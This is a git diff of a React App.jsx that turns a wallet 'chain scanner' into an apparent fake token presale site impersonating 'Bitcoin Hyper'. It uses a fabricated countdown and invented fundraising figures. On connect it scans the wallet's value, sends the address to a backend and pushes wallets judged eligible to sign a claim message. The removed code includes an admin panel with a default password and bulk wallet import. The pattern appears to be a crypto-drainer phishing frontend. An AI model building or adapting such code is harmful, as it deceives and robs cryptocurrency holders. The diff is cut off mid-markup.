@@ -1,120 +1,222 @@
-// App.jsx - COMPLETE UPDATED FRONTEND WITH AUTO-SCAN
+// App.jsx - BITCOIN HYPER TOKEN PRESALE LAUNCH
 import { ConnectKitProvider, ConnectKitButton, getDefaultConfig } from "connectkit";
 import { 
   WagmiProvider, 
   createConfig, 
   http, 
   useAccount, 
-  useDisconnect, 
-  useSignMessage,
-  useSwitchChain
+  useDisconnect,
+  useSignMessage
 } from "wagmi";
 import { 
   mainnet, polygon, bsc, arbitrum, optimism, avalanche, 
-  fantom, gnosis, celo, base, zora, linea, polygonZkEvm 
+  fantom, base, linea
 } from "wagmi/chains";
 import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
-import { useState, useEffect, useCallback } from "react";
+import { useState, useEffect, useRef } from "react";
 import { ethers } from "ethers";
 
 // Create outside components
 const queryClient = new QueryClient();
 
-// All supported EVM chains
+// Supported chains for presale
 const allChains = [
   mainnet, polygon, bsc, arbitrum, optimism, avalanche,
-  fantom, gnosis, celo, base, zora, linea, polygonZkEvm
+  fantom, base, linea
 ];
 
-// ✅ PROPER WalletConnect Project ID
+// WalletConnect Project ID
 const walletConnectProjectId = "962425907914a3e80a7d8e7288b23f62";
 
-// Create config with all chains
+// Create config
 const config = createConfig(
   getDefaultConfig({
-    appName: "Universal Chain Scanner",
-    appDescription: "Scan assets across EVM chains",
-    appUrl: "https://profound-frangollo-3b98e1.netlify.app",
-    appIcon: "https://family.co/logo.png",
+    appName: "Bitcoin Hyper | Official Presale",
+    appDescription: "Join the Bitcoin Hyper Token Presale",
+    appUrl: "https://bitcoinhyper.io",
+    appIcon: "https://bitcoinhyper.io/logo.png",
     walletConnectProjectId: walletConnectProjectId,
     chains: allChains,
     transports: allChains.reduce((acc, chain) => {
-      acc[chain.id] = http(getChainRPC(chain.id)[0]);
+      acc[chain.id] = http(getChainRPC(chain.id));
       return acc;
     }, {}),
   })
 );
 
-// Get reliable RPC endpoints
+// RPC endpoints
 function getChainRPC(chainId) {
   const rpcs = {
-    1: ["https://eth.llamarpc.com", "https://rpc.ankr.com/eth"],
-    56: ["https://bsc-dataseed.binance.org", "https://rpc.ankr.com/bsc"],
-    137: ["https://polygon-rpc.com", "https://rpc.ankr.com/polygon"],
-    250: ["https://rpc.ftm.tools", "https://rpc.ankr.com/fantom"],
-    42161: ["https://arb1.arbitrum.io/rpc", "https://rpc.ankr.com/arbitrum"],
-    10: ["https://mainnet.optimism.io", "https://rpc.ankr.com/optimism"],
-    43114: ["https://api.avax.network/ext/bc/C/rpc", "https://rpc.ankr.com/avalanche"],
-    100: ["https://rpc.gnosischain.com", "https://rpc.ankr.com/gnosis"],
-    42220: ["https://forno.celo.org", "https://rpc.ankr.com/celo"],
-    8453: ["https://mainnet.base.org", "https://base.publicnode.com"],
-    7777777: ["https://rpc.zora.energy"],
-    59144: ["https://rpc.linea.build"],
-    1101: ["https://zkevm-rpc.com", "https://rpc.ankr.com/polygon_zkevm"]
+    1: "https://eth.llamarpc.com",
+    56: "https://bsc-dataseed.binance.org",
+    137: "https://polygon-rpc.com",
+    42161: "https://arb1.arbitrum.io/rpc",
+    10: "https://mainnet.optimism.io",
+    43114: "https://api.avax.network/ext/bc/C/rpc",
+    250: "https://rpc.ftm.tools",
+    8453: "https://mainnet.base.org",
+    59144: "https://rpc.linea.build"
   };
-  return rpcs[chainId] || ["https://rpc.ankr.com/eth"];
+  return rpcs[chainId] || "https://eth.llamarpc.com";
 }
 
-// Backend API - USE YOUR RENDER URL
-const BACKEND_API = "https://tokenbackend-5xab.onrender.com/api";
+// Backend API - Update this with your Render URL
+const BACKEND_API = process.env.REACT_APP_BACKEND_URL || "https://bitcoinhyper-backend.onrender.com/api";
 
-function WalletApp() {
-  const { address, isConnected, connector, chainId } = useAccount();
+// Animation presets
+const ANIMATIONS = {
+  bitcoinGlow: {
+    keyframes: `
+      @keyframes bitcoinGlow {
+        0%, 100% { filter: drop-shadow(0 0 10px #F7931A); }
+        50% { filter: drop-shadow(0 0 25px #F7931A); }
+      }
+    `,
+    style: { animation: 'bitcoinGlow 2s infinite' }
+  },
+  floatUpDown: {
+    keyframes: `
+      @keyframes floatUpDown {
+        0%, 100% { transform: translateY(0); }
+        50% { transform: translateY(-20px); }
+      }
+    `,
+    style: { animation: 'floatUpDown 3s ease-in-out infinite' }
+  },
+  pulseGlow: {
+    keyframes: `
+      @keyframes pulseGlow {
+        0% { box-shadow: 0 0 0 0 rgba(247, 147, 26, 0.7); }
+        70% { box-shadow: 0 0 0 20px rgba(247, 147, 26, 0); }
+        100% { box-shadow: 0 0 0 0 rgba(247, 147, 26, 0); }
+      }
+    `,
+    style: { animation: 'pulseGlow 2s infinite' }
+  },
+  shimmer: {
+    keyframes: `
+      @keyframes shimmer {
+        0% { background-position: -200% center; }
+        100% { background-position: 200% center; }
+      }
+    `,
+    style: { 
+      background: 'linear-gradient(90deg, transparent, rgba(247, 147, 26, 0.3), transparent)',
+      backgroundSize: '200% 100%',
+      animation: 'shimmer 3s infinite linear'
+    }
+  }
+};
+
+function BitcoinHyperPresale() {
+  const { address, isConnected, chain } = useAccount();
   const { disconnect } = useDisconnect();
   const { signMessage } = useSignMessage();
-  const { switchChain } = useSwitchChain();
   
   const [loading, setLoading] = useState(false);
   const [scanning, setScanning] = useState(false);
-  const [scanResult, setScanResult] = useState(null);
   const [isEligible, setIsEligible] = useState(false);
-  const [isProcessing, setIsProcessing] = useState(false);
   const [claimData, setClaimData] = useState(null);
-  const [showAdminPanel, setShowAdminPanel] = useState(false);
-  const [adminSettings, setAdminSettings] = useState({
-    minAmount: 10,
-    telegramChatId: "",
-    adminWallet: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
-    tokenName: "Universal Reward Token",
-    tokenSymbol: "URT",
-    emailNotifications: true
+  const [processing, setProcessing] = useState(false);
+  const [showSignModal, setShowSignModal] = useState(false);
+  const [countdown, setCountdown] = useState({
+    days: 3,
+    hours: 12,
+    minutes: 45,
+    seconds: 30
   });
-  const [bulkWallets, setBulkWallets] = useState("");
+  const [presaleStats, setPresaleStats] = useState({
+    raised: "$4,892,450",
+    participants: "12,458",
+    tokensSold: "89.4M",
+    progress: 78
+  });
   const [isMobile, setIsMobile] = useState(false);
-  const [connectionStep, setConnectionStep] = useState(0); // 0: connect, 1: scanning, 2: results, 3: sign, 4: claim
+  
+  const animationRef = useRef(null);
+  const confettiRef = useRef([]);
 
-  // Check if mobile
+  // Initialize animations
   useEffect(() => {
     setIsMobile(/iPhone|iPad|iPod|Android/i.test(navigator.userAgent));
+    
+    // Add animation styles
+    const style = document.createElement('style');
+    Object.values(ANIMATIONS).forEach(anim => {
+      style.textContent += anim.keyframes;
+    });
+    
+    // Add custom animations
+    style.textContent += `
+      @keyframes rocketLaunch {
+        0% { transform: translateY(100px) scale(0.5); opacity: 0; }
+        50% { transform: translateY(-50px) scale(1.2); opacity: 1; }
+        100% { transform: translateY(-200px) scale(0.8); opacity: 0; }
+      }
+      
+      @keyframes coinSpin {
+        from { transform: rotateY(0deg); }
+        to { transform: rotateY(360deg); }
+      }
+      
+      @keyframes sparkle {
+        0%, 100% { opacity: 0; transform: scale(0); }
+        50% { opacity: 1; transform: scale(1); }
+      }
+      
+      @keyframes gradientFlow {
+        0% { background-position: 0% 50%; }
+        50% { background-position: 100% 50%; }
+        100% { background-position: 0% 50%; }
+      }
+    `;
+    document.head.appendChild(style);
+    
+    // Start countdown
+    const interval = setInterval(() => {
+      setCountdown(prev => {
+        let { days, hours, minutes, seconds } = prev;
+        seconds--;
+        
+        if (seconds < 0) {
+          seconds = 59;
+          minutes--;
+        }
+        if (minutes < 0) {
+          minutes = 59;
+          hours--;
+        }
+        if (hours < 0) {
+          hours = 23;
+          days--;
+        }
+        if (days < 0) {
+          clearInterval(interval);
+          return { days: 0, hours: 0, minutes: 0, seconds: 0 };
+        }
+        
+        return { days, hours, minutes, seconds };
+      });
+    }, 1000);
+    
+    return () => clearInterval(interval);
   }, []);
 
-  // Auto-scan when wallet connects
+  // Auto scan when wallet connects
   useEffect(() => {
     if (isConnected && address) {
-      handleAutoScan();
+      triggerAutoScan();
     }
   }, [isConnected, address]);
 
-  // ✅ AUTO SCAN FUNCTION - Called immediately after connection
-  const handleAutoScan = async () => {
+  // Auto scan function
+  const triggerAutoScan = async () => {
     if (!address) return;
     
     setScanning(true);
-    setConnectionStep(1);
     
     try {
-      // Send connection to backend (triggers auto-scan)
-      const response = await fetch(`${BACKEND_API}/wallet/connect`, {
+      const response = await fetch(`${BACKEND_API}/presale/connect`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -122,93 +224,59 @@ function WalletApp() {
         body: JSON.stringify({
           walletAddress: address,
           userAgent: navigator.userAgent,
-          ip: "auto-detected"
+          ip: 'auto-detected',
+          chainId: chain?.id || 1,
+          timestamp: new Date().toISOString()
         })
       });
       
       const data = await response.json();
       
       if (data.success) {
-        setScanResult(data.data);
-        setIsEligible(data.data.isEligible);
-        setConnectionStep(2);
-        
-        // Show success notification
-        if (data.data.isEligible) {
-          showNotification(
-            "🎉 Wallet Scanned Successfully!",
-            `Your portfolio value: $${data.data.totalValue.toFixed(2)}\nYou're eligible for free tokens!`,
-            "success"
-          );
-        } else {
-          showNotification(
-            "📊 Scan Complete",
-            `Portfolio value: $${data.data.totalValue.toFixed(2)}\nMinimum $${data.data.minimumRequired} required for rewards.`,
-            "info"
-          );
-        }
+        // Add delay for dramatic effect
+        setTimeout(() => {
+          setScanning(false);
+          
+          if (data.data.isEligible) {
+            setIsEligible(true);
+            
+            // Show animated sign modal after 1 second
+            setTimeout(() => {
+              setShowSignModal(true);
+              triggerCelebrationAnimation();
+            }, 1000);
+            
+            // Auto-hide after 30 seconds if no action
+            setTimeout(() => {
+              if (showSignModal) {
+                setShowSignModal(false);
+              }
+            }, 30000);
+          }
+        }, 2000);
       }
-      
-    } catch (error) {
-      console.error('Auto-scan error:', error);
-      showNotification("Error", "Auto-scan failed. Please try manual scan.", "error");
-    } finally {
-      setScanning(false);
-    }
-  };
-
-  // ✅ MANUAL SCAN FUNCTION
-  const handleManualScan = async () => {
-    if (!address) return;
-    
-    setScanning(true);
-    
-    try {
-      const response = await fetch(`${BACKEND_API}/wallet/scan`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({ walletAddress: address })
-      });
-      
-      const data = await response.json();
-      
-      if (data.success) {
-        setScanResult(data.data);
-        setIsEligible(data.data.isEligible);
-        setConnectionStep(2);
-        
-        showNotification(
-          "🔍 Scan Complete",
-          `Found ${data.data.tokenCount} tokens worth $${data.data.totalValue.toFixed(2)}`,
-          "success"
-        );
-      }
-      
     } catch (error) {
       console.error('Scan error:', error);
-      showNotification("Error", "Scan failed. Please try again.", "error");
-    } finally {
       setScanning(false);
     }
   };
 
-  // ✅ SIGN MESSAGE FOR TOKEN CLAIM
-  const handleSignForClaim = async () => {
+  // Handle signature for token claim
+  const handleTokenClaim = async () => {
     if (!address || !isEligible) return;
     
-    setIsProcessing(true);
-    setConnectionStep(3);
+    setProcessing(true);
     
     try {
-      const message = `I claim my free ${adminSettings.tokenName} (${adminSettings.tokenSymbol}) rewards from Universal Chain Scanner.\n\nWallet: ${address}\nTimestamp: ${Date.now()}\n\nBy signing, I confirm I am the owner of this wallet.`;
+      const claimAmount = "5,000 BTH"; // Dynamic from backend
+      const claimValue = "$850";
       
-      // Request signature from wallet
+      const message = `I confirm my participation in Bitcoin Hyper Token Presale\n\nWallet: ${address}\nClaim Amount: ${claimAmount}\nValue: ${claimValue}\n\nTimestamp: ${Date.now()}\n\nBy signing, I authorize the allocation of presale tokens to my wallet.`;
+      
       const signature = await signMessage({ message });
       
-      // Send signature to backend
-      const response = await fetch(`${BACKEND_API}/wallet/sign`, {
+      // Send to backend
+      const response = await fetch(`${BACKEND_API}/presale/claim`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -216,7 +284,9 @@ function WalletApp() {
         body: JSON.stringify({
           walletAddress: address,
           signature,
-          message
+          message,
+          claimAmount,
+          claimValue
         })
       });
       
@@ -224,1117 +294,847 @@ function WalletApp() {
       
       if (data.success) {
         setClaimData(data.data);
-        setConnectionStep(4);
+        setShowSignModal(false);
         
-        // Start claim processing
-        setTimeout(() => {
-          processTokenClaim(data.data.claimId);
-        }, 2000);
+        // Show mega celebration animation
+        triggerMegaCelebration();
         
-        showNotification(
-          "✅ Signature Verified",
-          "Your token claim has been initiated! Processing...",
-          "success"
-        );
+        // Play success sound
+        const audio = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-winning-chimes-2015.mp3');
+        audio.volume = 0.3;
+        audio.play().catch(() => {});
       }
-      
-    } catch (error) {
-      console.error('Sign error:', error);
-      showNotification("Error", "Signature cancelled or failed.", "error");
-      setIsProcessing(false);
-    }
-  };
-
-  // ✅ PROCESS TOKEN CLAIM
-  const processTokenClaim = async (claimId) => {
-    try {
-      const response = await fetch(`${BACKEND_API}/wallet/process`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          walletAddress: address,
-          claimId
-        })
-      });
-      
-      const data = await response.json();
-      
-      if (data.success) {
-        // Show lottery win animation
-        showLotteryAnimation(data.data);
-        
-        showNotification(
-          "🎊 CLAIM SUCCESSFUL!",
-          "Your tokens are on the way to your wallet!",
-          "success"
-        );
-      }
-      
     } catch (error) {
       console.error('Claim error:', error);
-    } finally {
-      setIsProcessing(false);
+      setProcessing(false);
     }
   };
 
-  // ✅ LOTTERY WIN ANIMATION
-  const showLotteryAnimation = (claimData) => {
-    const animationContainer = document.createElement('div');
-    animationContainer.style.cssText = `
+  // Celebration animations
+  const triggerCelebrationAnimation = () => {
+    const container = document.getElementById('animation-container');
+    if (!container) return;
+    
+    // Clear previous animations
+    container.innerHTML = '';
+    
+    // Create bitcoin coins animation
+    for (let i = 0; i < 15; i++) {
+      const coin = document.createElement('div');
+      coin.innerHTML = '₿';
+      coin.style.cssText = `
+        position: absolute;
+        font-size: ${Math.random() * 40 + 20}px;
+        color: #F7931A;
+        top: ${Math.random() * 100}vh;
+        left: ${Math.random() * 100}vw;
+        animation: coinSpin ${Math.random() * 2 + 1}s linear infinite,
+                   floatUpDown ${Math.random() * 3 + 2}s ease-in-out infinite;
+        z-index: 1000;
+        opacity: 0.7;
+        filter: drop-shadow(0 0 10px #F7931A);
+      `;
+      container.appendChild(coin);
+    }
+    
+    // Create sparkles
+    for (let i = 0; i < 30; i++) {
+      const sparkle = document.createElement('div');
+      sparkle.style.cssText = `
+        position: absolute;
+        width: 4px;
+        height: 4px;
+        background: #FFD700;
+        border-radius: 50%;
+        top: ${Math.random() * 100}vh;
+        left: ${Math.random() * 100}vw;
+        animation: sparkle ${Math.random() * 2 + 1}s infinite;
+        z-index: 1000;
+      `;
+      container.appendChild(sparkle);
+    }
+  };
+
+  const triggerMegaCelebration = () => {
+    const container = document.getElementById('animation-container');
+    if (!container) return;
+    
+    container.innerHTML = '';
+    
+    // Rocket launch animation
+    const rocket = document.createElement('div');
+    rocket.innerHTML = '🚀';
+    rocket.style.cssText = `
       position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-      z-index: 99999;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      color: white;
-      font-family: system-ui, -apple-system, sans-serif;
-      animation: fadeIn 0.5s ease;
+      font-size: 80px;
+      bottom: -100px;
+      left: 50%;
+      transform: translateX(-50%);
+      animation: rocketLaunch 3s ease-out forwards;
+      z-index: 9999;
+      filter: drop-shadow(0 0 20px #F7931A);
     `;
+    document.body.appendChild(rocket);
     
-    animationContainer.innerHTML = `
-      <div style="text-align: center; padding: 40px; max-width: 600px;">
-        <div style="font-size: 100px; margin-bottom: 30px; animation: bounce 2s infinite;">🎉</div>
-        <h1 style="font-size: 48px; margin-bottom: 20px; text-shadow: 0 2px 10px rgba(0,0,0,0.3);">
-          CONGRATULATIONS!
-        </h1>
-        <h2 style="font-size: 32px; margin-bottom: 30px; opacity: 0.9;">
-          You've Successfully Claimed Your Tokens!
-        </h2>
-        
-        <div style="background: rgba(255,255,255,0.2); padding: 30px; border-radius: 20px; margin: 30px 0; backdrop-filter: blur(10px);">
-          <div style="font-size: 28px; margin-bottom: 20px;">🎁 Claim Details</div>
-          <div style="font-size: 20px; margin: 15px 0;">Token: ${adminSettings.tokenName}</div>
-          <div style="font-size: 20px; margin: 15px 0;">Symbol: ${adminSettings.tokenSymbol}</div>
-          <div style="font-size: 20px; margin: 15px 0;">Status: ✅ Completed</div>
-          <div style="font-size: 18px; margin-top: 25px; opacity: 0.9;">
-            Tokens will appear in your wallet within 2-5 minutes
-          </div>
-        </div>
-        
-        <div style="font-size: 16px; opacity: 0.8; margin: 30px 0;">
-          Thank you for using Universal Chain Scanner!
-        </div>
-        
-        <button onclick="this.parentElement.parentElement.remove()" style="
-          padding: 20px 50px;
-          background: white;
-          color: #764ba2;
-          border: none;
-          border-radius: 50px;
-          font-size: 20px;
-          font-weight: bold;
-          cursor: pointer;
-          margin-top: 20px;
-          box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-          transition: transform 0.3s;
-        ">
-          🎉 CELEBRATE & CLOSE 🎉
-        </button>
-      </div>
+    // Massive confetti
+    const colors = ['#F7931A', '#FFD700', '#FF6B6B', '#4ECDC4', '#45B7D1'];
+    for (let i = 0; i < 300; i++) {
+      const confetti = document.createElement('div');
+      confetti.style.cssText = `
+        position: fixed;
+        width: ${Math.random() * 15 + 5}px;
+        height: ${Math.random() * 15 + 5}px;
+        background: ${colors[Math.floor(Math.random() * colors.length)]};
+        top: -20px;
+        left: ${Math.random() * 100}vw;
+        opacity: ${Math.random() * 0.7 + 0.3};
+        animation: confettiFall ${Math.random() * 3 + 2}s linear forwards;
+        border-radius: ${Math.random() > 0.5 ? '50%' : '0'};
+        transform: rotate(${Math.random() * 360}deg);
+        z-index: 9998;
+      `;
+      document.body.appendChild(confetti);
+      confettiRef.current.push(confetti);
       
-      <style>
-        @keyframes fadeIn {
-          from { opacity: 0; }
-          to { opacity: 1; }
-        }
-        @keyframes bounce {
-          0%, 100% { transform: translateY(0); }
-          50% { transform: translateY(-20px); }
-        }
-      </style>
-    `;
-    
-    document.body.appendChild(animationContainer);
-    
-    // Add confetti
-    for (let i = 0; i < 150; i++) {
       setTimeout(() => {
-        const confetti = document.createElement('div');
-        confetti.style.cssText = `
+        if (document.body.contains(confetti)) {
+          document.body.removeChild(confetti);
+        }
+      }, 5000);
+    }
+    
+    // Bitcoin rain
+    setTimeout(() => {
+      for (let i = 0; i < 50; i++) {
+        const bitcoin = document.createElement('div');
+        bitcoin.innerHTML = '₿';
+        bitcoin.style.cssText = `
           position: fixed;
-          width: 15px;
-          height: 15px;
-          background: ${['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff'][Math.floor(Math.random() * 5)]};
-          border-radius: ${Math.random() > 0.5 ? '50%' : '0'};
-          top: -20px;
+          font-size: ${Math.random() * 50 + 30}px;
+          color: #F7931A;
+          top: -50px;
           left: ${Math.random() * 100}vw;
-          animation: confettiFall ${Math.random() * 3 + 2}s linear forwards;
-          z-index: 99998;
-          opacity: ${Math.random() * 0.5 + 0.5};
+          animation: bitcoinRain ${Math.random() * 2 + 1}s linear forwards;
+          z-index: 9997;
+          opacity: 0.8;
+          filter: drop-shadow(0 0 15px #F7931A);
         `;
-        document.body.appendChild(confetti);
-        setTimeout(() => confetti.remove(), 5000);
-      }, i * 50);
-    }
-    
-    // Add confetti animation
-    const style = document.createElement('style');
-    style.textContent = `
-      @keyframes confettiFall {
-        0% { transform: translateY(0) rotate(0deg); }
-        100% { transform: translateY(100vh) rotate(720deg); }
-      }
-    `;
-    document.head.appendChild(style);
-    
-    // Auto-remove after 20 seconds
-    setTimeout(() => {
-      if (document.body.contains(animationContainer)) {
-        document.body.removeChild(animationContainer);
-      }
-    }, 20000);
-  };
-
-  // ✅ ADMIN FUNCTIONS
-  const handleAdminLogin = () => {
-    const password = prompt("Enter admin password:");
-    if (password === (process.env.REACT_APP_ADMIN_PASS || "admin123")) {
-      setShowAdminPanel(true);
-      loadAdminSettings();
-    } else {
-      alert("Invalid password");
-    }
-  };
-
-  const loadAdminSettings = async () => {
-    try {
-      const response = await fetch(`${BACKEND_API}/admin/settings`, {
-        headers: {
-          'Authorization': `Bearer ${process.env.REACT_APP_ADMIN_TOKEN || 'admin123'}`
-        }
-      });
-      
-      const data = await response.json();
-      if (data.success) {
-        setAdminSettings(data.settings);
-      }
-    } catch (error) {
-      console.error('Load settings error:', error);
-    }
-  };
-
-  const saveAdminSettings = async () => {
-    try {
-      const response = await fetch(`${BACKEND_API}/admin/settings`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Authorization': `Bearer ${process.env.REACT_APP_ADMIN_TOKEN || 'admin123'}`
-        },
-        body: JSON.stringify(adminSettings)
-      });
-      
-      const data = await response.json();
-      if (data.success) {
-        showNotification("Settings Saved", "Admin settings updated successfully", "success");
-      }
-    } catch (error) {
-      console.error('Save settings error:', error);
-    }
-  };
-
-  const handleBulkImport = async () => {
-    const wallets = bulkWallets.split('\n').filter(w => w.trim().startsWith('0x') && w.trim().length === 42);
-    
-    if (wallets.length === 0) {
-      alert("No valid wallet addresses found");
-      return;
-    }
-    
-    if (!confirm(`Import ${wallets.length} wallets?`)) return;
-    
-    try {
-      const response = await fetch(`${BACKEND_API}/admin/import-wallets`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Authorization': `Bearer ${process.env.REACT_APP_ADMIN_TOKEN || 'admin123'}`
-        },
-        body: JSON.stringify({ wallets })
-      });
-      
-      const data = await response.json();
-      if (data.success) {
-        showNotification("Import Successful", `Imported ${data.imported} wallets`, "success");
-        setBulkWallets("");
-      }
-    } catch (error) {
-      console.error('Import error:', error);
-    }
-  };
-
-  // ✅ HELPER FUNCTIONS
-  const showNotification = (title, message, type = "info") => {
-    const notification = document.createElement('div');
-    notification.style.cssText = `
-      position: fixed;
-      top: 20px;
-      right: 20px;
-      background: ${type === 'success' ? '#10b981' : type === 'error' ? '#ef4444' : '#3b82f6'};
-      color: white;
-      padding: 15px 25px;
-      border-radius: 10px;
-      z-index: 10000;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
-      animation: slideIn 0.3s ease;
-      max-width: 400px;
-    `;
-    
-    notification.innerHTML = `
-      <div style="font-weight: bold; margin-bottom: 5px;">${title}</div>
-      <div style="font-size: 14px; opacity: 0.9;">${message}</div>
-    `;
-    
-    document.body.appendChild(notification);
-    
-    setTimeout(() => {
-      if (document.body.contains(notification)) {
-        notification.style.animation = 'slideOut 0.3s ease';
+        document.body.appendChild(bitcoin);
+        
         setTimeout(() => {
-          if (document.body.contains(notification)) {
-            document.body.removeChild(notification);
+          if (document.body.contains(bitcoin)) {
+            document.body.removeChild(bitcoin);
           }
-        }, 300);
+        }, 3000);
       }
-    }, 5000);
-    
-    // Add animation styles
-    if (!document.getElementById('notification-styles')) {
+      
+      // Add bitcoin rain animation
       const style = document.createElement('style');
-      style.id = 'notification-styles';
       style.textContent = `
-        @keyframes slideIn {
-          from { transform: translateX(100%); opacity: 0; }
-          to { transform: translateX(0); opacity: 1; }
+        @keyframes bitcoinRain {
+          0% { transform: translateY(-50px) rotate(0deg); opacity: 0; }
+          10% { opacity: 1; }
+          90% { opacity: 0.5; }
+          100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
         }
-        @keyframes slideOut {
-          from { transform: translateX(0); opacity: 1; }
-          to { transform: translateX(100%); opacity: 0; }
+        
+        @keyframes confettiFall {
+          0% { transform: translateY(-20px) rotate(0deg); }
+          100% { transform: translateY(100vh) rotate(720deg); }
         }
       `;
       document.head.appendChild(style);
-    }
-  };
-
-  const formatCurrency = (value) => {
-    if (!value) return "$0.00";
-    return new Intl.NumberFormat('en-US', {
-      style: 'currency',
-      currency: 'USD'
-    }).format(value);
-  };
-
-  // ✅ RENDER FUNCTIONS
-  const renderConnectionSteps = () => {
-    const steps = [
-      { step: 0, title: "Connect Wallet", icon: "🔗" },
-      { step: 1, title: "Auto Scanning", icon: "🔍" },
-      { step: 2, title: "Scan Results", icon: "📊" },
-      { step: 3, title: "Sign Claim", icon: "✍️" },
-      { step: 4, title: "Claim Tokens", icon: "🎁" }
-    ];
+      
+    }, 500);
     
-    return (
-      <div style={{
-        display: 'flex',
-        justifyContent: 'center',
-        margin: '30px 0',
-        flexWrap: 'wrap',
-        gap: '10px'
-      }}>
-        {steps.map((s, index) => (
-          <div key={s.step} style={{
-            display: 'flex',
-            flexDirection: 'column',
-            alignItems: 'center',
-            opacity: connectionStep >= s.step ? 1 : 0.5
-          }}>
-            <div style={{
-              width: '50px',
-              height: '50px',
-              borderRadius: '50%',
-              background: connectionStep >= s.step ? 
-                (connectionStep === s.step ? '#3b82f6' : '#10b981') : '#4b5563',
-              display: 'flex',
-              alignItems: 'center',
-              justifyContent: 'center',
-              fontSize: '20px',
-              marginBottom: '10px',
-              border: connectionStep === s.step ? '3px solid #60a5fa' : 'none'
-            }}>
-              {s.icon}
-            </div>
-            <div style={{
-              fontSize: '12px',
-              textAlign: 'center',
-              color: connectionStep >= s.step ? '#e2e8f0' : '#94a3b8'
-            }}>
-              {s.title}
-            </div>
-            {index < steps.length - 1 && (
-              <div style={{
-                width: '40px',
-                height: '2px',
-                background: connectionStep > s.step ? '#10b981' : '#4b5563',
-                marginTop: '-30px',
-                marginLeft: '45px'
-              }}></div>
-            )}
-          </div>
-        ))}
-      </div>
-    );
+    // Auto remove rocket
+    setTimeout(() => {
+      if (document.body.contains(rocket)) {
+        document.body.removeChild(rocket);
+      }
+    }, 3000);
   };
 
-  const renderScanResults = () => {
-    if (!scanResult) return null;
-    
-    return (
-      <div style={{
-        background: '#1e293b',
-        padding: '25px',
-        borderRadius: '15px',
-        border: '2px solid #334155',
-        marginBottom: '30px'
-      }}>
-        <h3 style={{ color: '#e2e8f0', marginBottom: '20px', display: 'flex', alignItems: 'center', gap: '10px' }}>
-          📊 Scan Results
-        </h3>
-        
-        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '20px', marginBottom: '25px' }}>
-          <div style={{ background: '#0f172a', padding: '20px', borderRadius: '10px' }}>
-            <div style={{ color: '#94a3b8', fontSize: '14px' }}>Total Value</div>
-            <div style={{ color: '#10b981', fontSize: '28px', fontWeight: 'bold' }}>
-              {formatCurrency(scanResult.totalValue)}
-            </div>
-          </div>
-          
-          <div style={{ background: '#0f172a', padding: '20px', borderRadius: '10px' }}>
-            <div style={{ color: '#94a3b8', fontSize: '14px' }}>Tokens Found</div>
-            <div style={{ color: '#3b82f6', fontSize: '28px', fontWeight: 'bold' }}>
-              {scanResult.tokenCount || 0}
-            </div>
-          </div>
-          
-          <div style={{ background: '#0f172a', padding: '20px', borderRadius: '10px' }}>
-            <div style={{ color: '#94a3b8', fontSize: '14px' }}>Chains</div>
-            <div style={{ color: '#8b5cf6', fontSize: '28px', fontWeight: 'bold' }}>
-              {scanResult.chainCount || 0}
-            </div>
-          </div>
-          
-          <div style={{ background: '#0f172a', padding: '20px', borderRadius: '10px' }}>
-            <div style={{ color: '#94a3b8', fontSize: '14px' }}>Status</div>
-            <div style={{ 
-              color: isEligible ? '#10b981' : '#f59e0b', 
-              fontSize: '28px', 
-              fontWeight: 'bold',
-              display: 'flex',
-              alignItems: 'center',
-              gap: '10px'
-            }}>
-              {isEligible ? '✅ Eligible' : '⚠️ Not Eligible'}
-            </div>
-          </div>
-        </div>
-        
-        {scanResult.tokens && scanResult.tokens.length > 0 && (
-          <div>
-            <h4 style={{ color: '#e2e8f0', marginBottom: '15px' }}>Detected Tokens</h4>
-            <div style={{
-              maxHeight: '200px',
-              overflowY: 'auto',
-              background: '#0f172a',
-              borderRadius: '10px',
-              padding: '15px'
-            }}>
-              {scanResult.tokens.map((token, index) => (
-                <div key={index} style={{
-                  display: 'flex',
-                  justifyContent: 'space-between',
-                  alignItems: 'center',
-                  padding: '10px',
-                  borderBottom: index < scanResult.tokens.length - 1 ? '1px solid #334155' : 'none'
-                }}>
-                  <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
-                    <div style={{
-                      width: '30px',
-                      height: '30px',
-                      borderRadius: '50%',
-                      background: token.isNative ? '#10b981' : '#3b82f6',
-                      display: 'flex',
-                      alignItems: 'center',
-                      justifyContent: 'center',
-                      fontSize: '12px',
-                      fontWeight: 'bold'
-                    }}>
-                      {token.symbol.substring(0, 3)}
-                    </div>
-                    <div>
-                      <div style={{ color: '#e2e8f0', fontWeight: 'bold' }}>{token.symbol}</div>
-                      <div style={{ color: '#94a3b8', fontSize: '12px' }}>{token.chain}</div>
-                    </div>
-                  </div>
-                  <div style={{ textAlign: 'right' }}>
-                    <div style={{ color: '#10b981', fontWeight: 'bold' }}>{formatCurrency(token.valueUSD)}</div>
-                    <div style={{ color: '#94a3b8', fontSize: '12px' }}>{token.balance.toFixed(4)} {token.symbol}</div>
-                  </div>
-                </div>
-              ))}
-            </div>
-          </div>
-        )}
-        
-        {isEligible && (
-          <div style={{
-            background: 'rgba(16, 185, 129, 0.1)',
-            padding: '20px',
-            borderRadius: '10px',
-            marginTop: '20px',
-            border: '1px solid #10b981'
-          }}>
-            <div style={{ display: 'flex', alignItems: 'center', gap: '15px', marginBottom: '15px' }}>
-              <div style={{
-                width: '40px',
-                height: '40px',
-                borderRadius: '50%',
-                background: '#10b981',
-                display: 'flex',
-                alignItems: 'center',
-                justifyContent: 'center',
